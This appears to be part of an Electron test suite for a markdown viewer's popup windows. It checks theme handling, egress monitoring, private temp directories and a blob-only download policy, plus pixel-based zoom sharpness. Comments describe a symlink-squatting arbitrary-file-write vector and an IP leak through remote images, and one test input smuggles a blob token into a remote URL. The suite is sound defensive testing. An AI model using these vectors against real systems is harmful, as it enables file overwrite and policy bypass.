          scheme:window.foliaThemes.schemeFor(window.foliaThemes.storedMode()).id
        };
      })()`,
    );
    check(
      `FEATURE the app really is in ${label} mode with both maximize buttons rendered`,
      parsed.dark === wantDark && parsed.table === 1 && parsed.mermaid === 1 && parsed.image === 1 &&
        parsed.path === documentFile && parsed.markdown === themeDoc &&
        parsed.descriptor.ref === admitted.descriptor.ref && parsed.scheme === themeId &&
        main.__shutdown.documentAdmissionIsCurrent(parsed.descriptor.ref),
      parsed,
    );

    for (const [what, selector] of [
      ["table", ".table-maximize-btn"],
      ["mermaid", ".mermaid-maximize-btn"],
      ["image", ".img-zoom-btn"],
    ]) {
      const popup = await openPopup("open-" + what + "-popup", null, 600,
        `document.querySelector(${JSON.stringify(selector)}).click(); true`);
      check(`FEATURE ${what} popup opens from a real click in ${label} mode`, !!popup);
      const receipt = windows.get(popup.id).receipt;
      check(`FEATURE ${what} ${label} click carries the current boolean mode`,
        receipt.payload.isDarkMode === wantDark, receipt.payload.isDarkMode);
      // Asserted as a luminance band rather than an exact hex so that a palette
      // tweak does not fail the suite; what must never happen is a light popup
      // over a dark app.
      const bg = await popupEval(
        popup,
        `(() => {
          const c = getComputedStyle(document.body).backgroundColor;
          const m = c.match(/\\d+/g) || [255, 255, 255];
          const lum = (0.299 * +m[0] + 0.587 * +m[1] + 0.114 * +m[2]) / 255;
          return JSON.stringify({ c, lum });
        })()`,
      );
      const lum = bg && !bg.__evalError ? JSON.parse(bg).lum : null;
      check(
        `FEATURE ${what} popup opened from a real click follows the app's ${label} theme`,
        lum !== null && (wantDark ? lum < 0.3 : lum > 0.7),
        `${bg} (window bg ${popup.getBackgroundColor && popup.getBackgroundColor()})`,
      );
      await closeAll();
    }
  }

  // ==========================================================================
  // SEC-11/12 - the network sentinel.
  //
  // A refused fetch or unchanged URL alone cannot rule out a request that
  // leaves the page and merely fails. The observer records requests BEFORE its
  // cancellation backstop; reaching it for a probe is a failure, not protection.
  //
  // POST, location assignment and window.open supply executed actors. The meta
  // refresh inputs are sanitizer cases, not navigation-guard actors. The
  // permitted image request separately proves that this observer is live.
  // ==========================================================================
  const escaped = netSentinel.filter((r) => r.url.includes(PROBE_HOST));
  check(
    "SEC-11/12 no exfil or navigation probe ever reached the network stack",
    escaped.length === 0,
    JSON.stringify(escaped.slice(0, 5)),
  );
  // The popups legitimately render remote <img> referenced by the document, so
  // "zero requests" is the wrong invariant - it would fail on a working
  // feature. The right one is that image loading is the *only* egress the
  // popup can perform: no XHR/fetch, no script, no stylesheet, no subframe,
  // no navigation. Anything else appearing here is a new covert channel.
  //
  // Worth recording as a product observation rather than a test failure:
  // maximizing an image from a hostile document does contact its host, which
  // leaks the reader's IP. That is inherited from the main viewer's behaviour
  // and is a policy decision, not a regression - see docs/SECURITY-AUDIT.md.
  const nonImage = netSentinel.filter((r) => r.type !== "image");
  check(
    "SEC-12 popups can only ever emit image loads, never any other request type",
    nonImage.length === 0,
    JSON.stringify(nonImage.slice(0, 5)),
  );

  // ==========================================================================
  // SEC-20 — the generated popup document must live in a private, unguessable
  // temp directory, not at a fixed path in the shared one.
  //
  // The old paths were `os.tmpdir()/omnicore-temp-<kind>.html`. On Linux and
  // macOS that directory is world-writable, so a local process can pre-create
  // the exact path as a symlink and `fs.writeFileSync` follows it - opening a
  // popup becomes an arbitrary file write as the user.
  //
  // Driven through the real IPC entry point, so what is measured is where the
  // document the popup actually loaded came from.
  // ==========================================================================
  const tmpRoot = os.tmpdir();
  const mermaidA = await openPopup("open-mermaid-popup", {
    svgContent: "<svg xmlns='http://www.w3.org/2000/svg'><text>A</text></svg>",
    isDarkMode: true,
  });
  const mermaidB = await openPopup("open-mermaid-popup", {
    svgContent: "<svg xmlns='http://www.w3.org/2000/svg'><text>B</text></svg>",
    isDarkMode: true,
  });
  const pathOf = (p) => {
    if (!p) return null;
    try {
      return fileURLToPath(windows.get(p.id).originalURL);
    } catch (e) {
      return null;
    }
  };
  // A file:// URL yields forward slashes while os.tmpdir() yields backslashes
  // on Windows, so the two are normalised before being compared. Without this
  // the directory clause below silently compares unequal strings and passes no
  // matter where the document lives - a vacuous assertion of exactly the kind
  // this suite exists to avoid.
  const sameDir = (a, b) =>
    !!a && !!b && path.resolve(a).toLowerCase() === path.resolve(b).toLowerCase();
  const pathA = pathOf(mermaidA);
  const pathB = pathOf(mermaidB);
  check("SEC-20 distinct generated files retain their exact A and B diagram content",
    !!pathA && !!pathB && pathA !== pathB &&
      fs.readFileSync(pathA, "utf8").includes("<text>A</text>") &&
      fs.readFileSync(pathB, "utf8").includes("<text>B</text>") &&
      (await popupEval(mermaidA, "document.querySelector('svg text')?.textContent")) === "A" &&
      (await popupEval(mermaidB, "document.querySelector('svg text')?.textContent")) === "B",
    { pathA, pathB });
  check(
    "SEC-20 the popup document is not at the old fixed, guessable temp path",
    !!pathA &&
      !/omnicore-temp-mermaid\.html$/.test(pathA) &&
      !sameDir(path.dirname(pathA), tmpRoot),
    JSON.stringify({ pathA, tmpRoot }),
  );
  // Two popups of the same kind used to share one filename, so the second
  // overwrote the first and whichever closed first deleted the other's
  // document. That is a plain bug as well as the security problem.
  check(
    "SEC-20 two popups of the same kind get separate private directories",
    !!pathA && !!pathB && !sameDir(path.dirname(pathA), path.dirname(pathB)),
    JSON.stringify({ dirA: pathA && path.dirname(pathA), dirB: pathB && path.dirname(pathB) }),
  );
  // Filesystem premise only: this does not observe the flag used by the
  // production writer. A pre-existing path must be refused, not overwritten.
  const squatDir = tempDir("mdv-squat-");
  ownedFixtures.add(squatDir);
  const squatFile = path.join(squatDir, "taken.html");
  fs.writeFileSync(squatFile, "original", "utf8");
  let squatRefused = false;
  try {
    fs.writeFileSync(squatFile, "overwritten", { encoding: "utf8", flag: "wx" });
  } catch (e) {
    squatRefused = e && e.code === "EEXIST";
  }
  check(
    "SEC-20 the 'wx' flag the fix relies on really does refuse an existing path",
    squatRefused === true && fs.readFileSync(squatFile, "utf8") === "original",
    JSON.stringify({ squatRefused, content: fs.readFileSync(squatFile, "utf8") }),
  );
  releaseTempDir(squatDir);

  // Closing one must not disturb the other, and must take its own directory
  // with it rather than leaking one per popup.
  const dirA = pathA && path.dirname(pathA);
  const dirB = pathB && path.dirname(pathB);
  await closePopup(mermaidA);
  await sleep(700);
  check(
    "SEC-20 closing one popup removes only its own document, not the other's",
    !!dirA && !!dirB && !fs.existsSync(dirA) && fs.existsSync(dirB) &&
      fs.existsSync(pathB) && (await popupEval(mermaidB, "document.querySelector('svg text')?.textContent")) === "B",
    JSON.stringify({ aGone: !!dirA && !fs.existsSync(dirA), bStillThere: !!dirB && fs.existsSync(dirB) }),
  );
  await closePopup(mermaidB);
  await sleep(700);
  check(
    "SEC-20 the temp directory is cleaned up when the popup closes",
    !!dirB && !fs.existsSync(dirB),
    JSON.stringify({ dirB, stillThere: dirB && fs.existsSync(dirB) }),
  );

  // -------------------------------------------------------------------------
  // Pop-out render QUALITY (not security, but this is the popup harness and
  // these are popup-only surfaces).
  //
  // Upstream 03b5423 drops `will-change: transform` from the zoom viewport,
  // reporting that it makes the SVG rasterize once and then stretch as a
  // bitmap. Confirmed here by capturing the window at 600% zoom and looking at
  // the pixels: a crisp vector render is bimodal (near-black glyph, near-white
  // paper) while an upscaled bitmap ramps across many mid-tones.
  //
  // The measurement is on the RENDERED FRAME, not on the CSS property, and the
  // old value is re-applied in-place as the probe's own vacuity guard: if
  // forcing promotion does not move the metric, the metric is measuring
  // nothing and every assertion here is worthless.
  // -------------------------------------------------------------------------
  const SHARP_SVG =
    "<svg xmlns='http://www.w3.org/2000/svg' width='400' height='120' viewBox='0 0 400 120'>" +
    "<rect x='10' y='10' width='380' height='100' fill='#ffffff' stroke='#333333' stroke-width='2'/>" +
    "<text x='30' y='55' font-family='sans-serif' font-size='18' fill='#111111'>Sharpness probe WWWmmm</text>" +
    "<text x='30' y='88' font-family='sans-serif' font-size='12' fill='#111111'>small text 0123456789 ijl</text>" +
    "</svg>";

  // Fraction of pixels sitting between "clearly ink" and "clearly paper".
  // Sharp edges cross that band in ~1 pixel; a stretched bitmap smears it.
  //
  // Clearance between the controls overlay's right edge and the first sampled
  // column. The overlay has a soft shadow and rounded corners that bleed a few
  // device pixels past its bounding rect, so sampling flush against it would
  // count chrome as diagram. 24 device px covers the shadow at DPR 1-2.
  const OVERLAY_GUTTER_PX = 24;
  // The discrimination is statistical, so the sample has to be wide enough for
  // the ratio to mean anything. Derived, not guessed: the sampled band is
  // 0.47 * height tall (y0=0.08H, y1=0.55H), so at the smallest window this
  // suite opens (900 device px tall => ~423 rows) a 128-column sample yields
  // ~54000 pixels, comfortably above the >10000 floor the fraction needs to be
  // stable. If the overlay ever grows enough to squeeze the sample below this,
  // that is a named failure rather than a quietly meaningless number.
  const MIN_SAMPLING_WIDTH_PX = 128;
  async function softEdgeFraction(win) {
    // capturePage() intermittently rejects with UnknownVizError under load -
    // observed during a revert run, where it surfaced as the whole suite
    // throwing instead of the assertion under test failing. Retry rather than
    // let a compositor hiccup masquerade as a result.
    //
    // It can also return the PREVIOUS frame when the window is not the
    // foreground window, which is worse: two captures come back byte-identical
    // and an A/B reads as "no difference". Ask for a fresh frame explicitly and
    // let the caller verify liveness.
    let img = null;
    let lastErr = null;
    const scope = windows.get(win.id).scope;
    for (let attempt = 0; attempt < 4 && !img; attempt++) {
      try {
        if (!win.isDestroyed()) {
          win.showInactive();
          win.moveTop();
        }
        const frame = await popupEval(win,
          "new Promise(r => requestAnimationFrame(() => requestAnimationFrame(() => r(true))))", 3000);
        if (frame !== true) throw new Error("sharpness fresh animation frames did not complete");
        assertDocumentScope(scope);
        const candidate = await bounded(win.capturePage(), "sharpness actual rendered capture", 3000);
        assertDocumentScope(scope);
        if (candidate && candidate.getSize().width > 0) img = candidate;
      } catch (e) {
        lastErr = e;
      }
      if (!img) await sleep(500);
    }
    if (!img) {
      return {
        soft: 0,
        total: 0,
        fraction: 0,
        samplingWidth: 0,
        overlayFraction: 0,
        captureFailed: String(lastErr),
      };
    }
    // The sampling window used to start at a hard-coded 30% of the width, on the
    // assumption that the controls overlay ends before it. That assumption is
    // invisible in the numbers: if the overlay ever grew past it, its crisp
    // DOM-drawn text would be counted as "shipped" sharpness and could hide a
    // real bitmap-stretch regression. Derive it from the overlay instead.
    let overlayRight = 0;
    try {
      overlayRight = await popupEval(win,
        `(() => {
           const dpr = window.devicePixelRatio || 1;
           let r = 0;
           document.querySelectorAll('.ui-overlay, .controls').forEach(el => {
             const b = el.getBoundingClientRect();
             if (b.width > 0 && b.height > 0) r = Math.max(r, b.right * dpr);
           });
           return r;
         })()`, 3000,
      );
      if (typeof overlayRight !== "number") overlayRight = NaN;
    } catch {
      overlayRight = NaN; // Invalid geometry must never silently sample chrome.
    }
    const { width, height } = img.getSize();
    const buf = img.toBitmap(); // BGRA
    // No upper clamp: clamping would silently sample contaminated pixels if the
    // overlay ever grew past it, which is the exact failure the derivation was
    // added to prevent. Because x0 is always >= overlayRight + gutter, overlay
    // pixels cannot enter the sample by construction - so what actually needs
    // defending is that ENOUGH pixels are left to measure, which is why
    // `samplingWidth` is returned and asserted rather than a ratio.
    const x0 = Math.max(
      Math.floor(width * 0.3),
      Math.ceil(overlayRight) + OVERLAY_GUTTER_PX,
    );
    const x1 = Math.floor(width * 0.95);
    const y0 = Math.floor(height * 0.08);
    const y1 = Math.floor(height * 0.55);
    let soft = 0;
    let total = 0;
    for (let y = y0; y < y1; y++) {
      for (let x = x0; x < x1; x++) {
        const i = (y * width + x) * 4;
        const lum = 0.114 * buf[i] + 0.587 * buf[i + 1] + 0.299 * buf[i + 2];
        total++;
        if (lum > 40 && lum < 215) soft++;
      }
    }
    return {
      soft,
      total,
      fraction: total ? soft / total : 0,
      samplingWidth: Math.max(0, x1 - x0),
      overlayFraction: width ? overlayRight / width : 0,
      width, height,
      frameHash: createHash("sha256").update(buf).digest("hex"),
    };
  }

  async function measureViewport(popup, artifactName) {
    const ev = async code => {
      const value = await popupEval(popup, code);
      if (value?.__evalError) throw new Error(value.__evalError);
      return value;
    };
    const geometry = await ev(`(() => {
      const viewport=document.getElementById('viewport'), content=viewport?.querySelector('svg,img');
      const rect=content?.getBoundingClientRect();
      return {exists:!!viewport,loaded:content?.tagName.toLowerCase()==='svg'||
        (content?.complete&&content.naturalWidth===400&&content.naturalHeight===120),
        width:rect?.width??0,height:rect?.height??0};
    })()`);
    check(`sharpness ${artifactName} contains loaded vector content with valid geometry`,
      geometry.exists && geometry.loaded && geometry.width > 0 && geometry.height > 0, geometry);
    if (!geometry.exists || !geometry.loaded || geometry.width <= 0 || geometry.height <= 0) {
      throw new Error("sharpness fixture is not genuinely rendered");
    }
    await ev(
      "state.scale = 6; state.pointX = -300; state.pointY = -150; updateTransform(); null",
    );
    await sleep(1000);
    const readZoom = () => ev(`(() => {
      const matrix=new DOMMatrixReadOnly(getComputedStyle(document.getElementById('viewport')).transform);
      return {scale:state.scale,a:matrix.a,b:matrix.b,c:matrix.c,d:matrix.d};
    })()`);
    const shippedZoom = await readZoom();
    check(`sharpness ${artifactName} shipped viewport is actually rendered at 600%`,
      shippedZoom.scale === 6 && shippedZoom.a === 6 && shippedZoom.d === 6 &&
        shippedZoom.b === 0 && shippedZoom.c === 0, shippedZoom);
    const shipped = await softEdgeFraction(popup);
    const shippedWillChange = await ev(
      "getComputedStyle(document.getElementById('viewport')).willChange",
    );
    // Capture here, not at the end: the promoted leg below deliberately puts
    // the window back into the BROKEN state, so an artifact taken afterwards
    // would show a blurry frame and read as a failure of the shipped code.
    const scope = windows.get(popup.id).scope;
    assertDocumentScope(scope);
    const shot = await bounded(captureScreenshot(popup, artifactName), "shipped sharpness artifact", 4000);
    assertDocumentScope(scope);
    check(`sharpness ${artifactName} shipped artifact capture succeeds`,
      typeof shot === "string" && shot.length > 0, shot);
    if (shot) console.log("zoom artifact (shipped state): " + shot);
    // Put the old value back and repeat the whole gesture. The order matters
    // and a first attempt at this got it wrong: promoting an ALREADY-zoomed
    // layer changes nothing, because it is already rasterized at that scale.
    // The defect only appears when the layer is promoted while small and the
    // zoom then stretches that raster - which is exactly what a user does.
    await ev("state.scale = 1; state.pointX = 0; state.pointY = 0; updateTransform(); null");
    await sleep(400);
    await ev(
      "document.getElementById('viewport').style.willChange = 'transform';" +
        " void document.getElementById('viewport').offsetHeight; null",
    );
    await sleep(600);
    await ev(
      "state.scale = 6; state.pointX = -300; state.pointY = -150; updateTransform(); null",
    );
    await sleep(1000);
    const promotedZoom = await readZoom();
    check(`sharpness ${artifactName} promoted comparison is actually rendered at 600%`,
      promotedZoom.scale === 6 && promotedZoom.a === 6 && promotedZoom.d === 6 &&
        promotedZoom.b === 0 && promotedZoom.c === 0, promotedZoom);
    const promoted = await softEdgeFraction(popup);
    check(`sharpness ${artifactName} measures live distinct frames with valid sampling geometry`,
      shipped.width > 0 && shipped.height > 0 && promoted.width > 0 && promoted.height > 0 &&
        shipped.total > 10000 && promoted.total > 10000 &&
        shipped.samplingWidth >= MIN_SAMPLING_WIDTH_PX &&
        promoted.samplingWidth >= MIN_SAMPLING_WIDTH_PX &&
        !!shipped.frameHash && !!promoted.frameHash && shipped.frameHash !== promoted.frameHash,
      { shipped, promoted });
    return { shipped, promoted, shippedWillChange };
  }

  await closeAll();
  const sharpMermaid = await openPopup("open-mermaid-popup", {
    svgContent: SHARP_SVG,
    isDarkMode: false,
  });
  check("sharpness: the mermaid pop-out opened", !!sharpMermaid, "no window");
  if (sharpMermaid) {
    const m = await measureViewport(sharpMermaid, "popup-mermaid-zoom-sharp");
    // The sampling window starts past the controls overlay, so overlay pixels
    // cannot enter the sample by construction. What that construction can still
    // do is squeeze the sample down to nothing - and a fraction computed over a
    // handful of columns is noise that would read as either verdict. Pin the
    // derived minimum rather than a ratio: this is the load-bearing guard, and
    // overlayFraction is reported alongside only as a diagnostic.
    check(
      "the sharpness sample is wide enough for the fraction to mean anything",
      m.shipped.samplingWidth >= MIN_SAMPLING_WIDTH_PX &&
        m.promoted.samplingWidth >= MIN_SAMPLING_WIDTH_PX,
      JSON.stringify({
        shipped: m.shipped.samplingWidth,
        promoted: m.promoted.samplingWidth,
        required: MIN_SAMPLING_WIDTH_PX,
        overlayFraction: m.shipped.overlayFraction,
      }),
    );
    check(
      "sharpness probe discriminates: promoting the mermaid viewport blurs it",
      m.promoted.fraction > m.shipped.fraction * 1.3 && m.shipped.total > 10000,
      JSON.stringify(m),
    );
    check(
      "the mermaid pop-out renders crisply at 600%, not as a stretched bitmap",
      m.shippedWillChange === "auto" &&
        m.shipped.fraction < m.promoted.fraction * 0.8,
      JSON.stringify(m),
    );
  }

  await closeAll();
  const sharpImage = await openPopup("open-image-popup", {
    src:
      "data:image/svg+xml;base64," +
      Buffer.from(SHARP_SVG, "utf8").toString("base64"),
    alt: "vector probe",
    isDarkMode: false,
  });
  check("sharpness: the image pop-out opened", !!sharpImage, "no window");
  if (sharpImage) {
    const m = await measureViewport(sharpImage, "popup-image-zoom-sharp");
    check(
      "the image sharpness sample is wide enough for the fraction to mean anything",
      m.shipped.samplingWidth >= MIN_SAMPLING_WIDTH_PX &&
        m.promoted.samplingWidth >= MIN_SAMPLING_WIDTH_PX,
      JSON.stringify(m),
    );
    check(
      "sharpness probe discriminates: promoting the image viewport blurs it",
      m.promoted.fraction > m.shipped.fraction * 1.3 && m.shipped.total > 10000,
      JSON.stringify(m),
    );
    // Beyond upstream, which only touched the diagram viewports: the image
    // pop-out is not raster-only, so it needs the same treatment.
    check(
      "the image pop-out renders vector content crisply at 600%",
      m.shippedWillChange === "auto" &&
        m.shipped.fraction < m.promoted.fraction * 0.8,
      JSON.stringify(m),
    );
  }
  await closeAll();

  // ==========================================================================
  // SEC-30 - the download policy in the main process
  //
  // A download is not a navigation, so the will-navigate / will-redirect /
  // will-frame-navigate / setWindowOpenHandler denies asserted above cannot see
  // one, and CSP has no directive that governs it. main.js therefore denies at
  // will-download on the default session, which is the complete surface: the
  // app creates no partitions and passes no custom session to any of its four
  // BrowserWindow sites.
  //
  // Two separate claims, because either alone fails open. The predicate proves
  // the RULE is right; a listener that exists with an inverted or deleted rule
  // would still satisfy the wiring check. The wiring check proves the rule is
  // actually CONNECTED; a correct predicate nothing calls protects nothing.
  const { isDownloadAllowed } = require("../src/main.js");
  const dlPolicy = {
    blob: isDownloadAllowed("blob:file:///6ebb68e1-51ec-4e8b-9572-116dea3fdbf9"),
    http: isDownloadAllowed("http://127.0.0.1:1/x"),
    https: isDownloadAllowed("https://probe.invalid/x"),
    file: isDownloadAllowed(pathToFileURL(readableFile).href),
    data: isDownloadAllowed("data:text/plain,x"),
    // Substring-not-prefix would let a remote URL carrying the token through.
    sneaky: isDownloadAllowed("https://probe.invalid/blob:file:///x"),
    nonString: isDownloadAllowed(undefined),
  };
  check(
    "SEC-30 the download policy admits the app's blob: exports and nothing else",
    dlPolicy.blob === true &&
      dlPolicy.http === false &&
      dlPolicy.https === false &&
      dlPolicy.file === false &&
      dlPolicy.data === false &&
      dlPolicy.sneaky === false &&
      dlPolicy.nonString === false,
    JSON.stringify(dlPolicy),
  );
  check(
    "SEC-30 the download policy is wired to the default session",
    session.defaultSession.listeners("will-download").filter(listener => listener !== downloadBackstop).length > 0,
    JSON.stringify({
      productionListeners: session.defaultSession.listeners("will-download").filter(listener => listener !== downloadBackstop).length,
    }),
  );
  check("no popup operation reached a native Save chooser", nativeSaveCalls === 0, nativeSaveCalls);
  check("no popup or Main action reached an OS external opener",
    (await readExternalOpens(hostWindow)).length === 0 && (await readShellOpens(hostWindow)).length === 0);

}

app.whenReady().then(run).then(() => finish(), error => finish(error)).catch(fatal);
